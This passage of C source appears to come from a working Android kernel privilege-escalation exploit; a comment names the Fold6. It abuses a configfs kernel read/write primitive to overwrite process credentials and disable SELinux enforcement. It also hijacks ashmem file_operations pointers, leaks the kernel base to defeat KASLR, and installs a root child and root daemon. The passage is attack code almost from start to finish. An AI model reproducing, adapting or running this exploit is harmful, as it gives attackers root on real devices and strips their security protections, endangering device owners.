      cfi_last_step = 17;
      cfi_last_errno = 0;
      goto fail;
    }
    if (real_cred != cred &&
        !cfi_patch_cred_object(fd, real_cred, "real_cred")) {
      cfi_last_step = 18;
      cfi_last_errno = 0;
      goto fail;
    }
    direct_cred_patch = 1;
  } else if (cred_env && *cred_env) {
    char *cred_end = NULL;
    errno = 0;
    uintptr_t cred = (uintptr_t)strtoull(cred_env, &cred_end, 0);
    if (errno || cred_end == cred_env || *cred_end ||
        !is_direct_ptr(cred) || (cred & 3)) {
      pr_error("cfi direct cred invalid address=%s\n", cred_env);
      cfi_last_step = 12;
      cfi_last_errno = EINVAL;
      goto fail;
    }
    if (!cfi_patch_cred_object(fd, cred, "cred")) {
      cfi_last_step = 13;
      cfi_last_errno = 0;
      goto fail;
    }
    direct_cred_patch = 1;
  }

  if (direct_cred_patch) {
    uint8_t selinux_off = 0;
    ssize_t selinux_write =
        configfs_write_once(fd, text_addr(SELINUX_ENFORCING),
                            &selinux_off, sizeof(selinux_off));
    pr_info("cfi direct patch selinux write=%zd\n", selinux_write);
    if (selinux_write != (ssize_t)sizeof(selinux_off)) {
      cfi_last_step = 14;
      cfi_last_errno = errno;
      goto fail;
    }
  }

  if (canonical_bootstrap) {
    pr_info("cfi skip misc_fops alias read: canonical configfs R/W verified\n");
  } else {
    uint64_t before = 0;
    ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
    fops_before = before;
    pr_info("cfi fops_before ret=%zd value=%016llx want=%016zx errno=%d\n",
            rb, (unsigned long long)before, fake_fops, errno);
    if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
      cfi_last_step = 4;
      cfi_last_errno = errno;
      goto fail;
    }
  }

  if (canonical_bootstrap) {
    pr_info("cfi skip slide repair/leak: canonical bootstrap already has KASLR\n");
  } else {
    if (!restore_slide_boot_id(fd)) {
      cfi_last_step = 10;
      cfi_last_errno = errno;
      goto fail;
    }

    if (!leak_kernel_base(fd)) {
      cfi_last_step = 9;
      cfi_last_errno = errno;
      goto fail;
    }
  }

  int installed = direct_cred_patch;
  if (!direct_cred_patch) {
    pipe_stage_attempts = 0;
    for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
      pipe_stage_attempts++;
      if (attempt != 0) {
        reset_pipe_attempt();
      }
      if (install_child_root(fd)) {
        installed = 1;
        break;
      }
      if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
          physrw_read64_ok && physrw_write64_ok) {
        break;
      }
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!direct_cred_patch && active_offsets && active_offsets->umh_root) {
    for (int attempt = 0; attempt < 100; attempt++) {
      if (access(CFI_ROOT_SOCKET, F_OK) == 0) {
        atomic_store(&cfi_root_daemon_ready, 1);
        break;
      }
      usleep(50000);
    }
    pr_info("cfi umh root socket ready=%d\n",
            atomic_load(&cfi_root_daemon_ready));
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  if (canonical_bootstrap) {
    pr_info("cfi skip restored-fops alias read\n");
  } else {
    uint64_t after = 0;
    ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
    fops_after = after;
    if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
      cfi_last_step = 6;
      cfi_last_errno = errno;
      goto fail;
    }
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  int direct_daemon_ready = 1;
  if (direct_cred_patch && getenv("CFI_STAGE_IN_CONSUMER")) {
    int direct_uid = getuid();
    direct_daemon_ready =
        direct_uid == 0 && ghostlock_start_root_daemon_early();
    pr_info("cfi direct consumer uid=%d daemon=%d\n",
            direct_uid, direct_daemon_ready);
  }
  /* Keep the original completion path.  The UMH helper has already detached;
   * introducing a post-handshake fork/keeper here changes the route-worker
   * timing and was observed to reboot the Fold6 immediately after the hold
   * log. */
  reset_pipe_attempt();
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops) &&
      direct_daemon_ready) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    if (direct_cred_patch && getenv("CFI_STAGE_IN_CONSUMER")) {
      atomic_store(&cfi_root_daemon_ready, 1);
    }
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  reset_pipe_attempt();
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (!canonical_bootstrap && can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
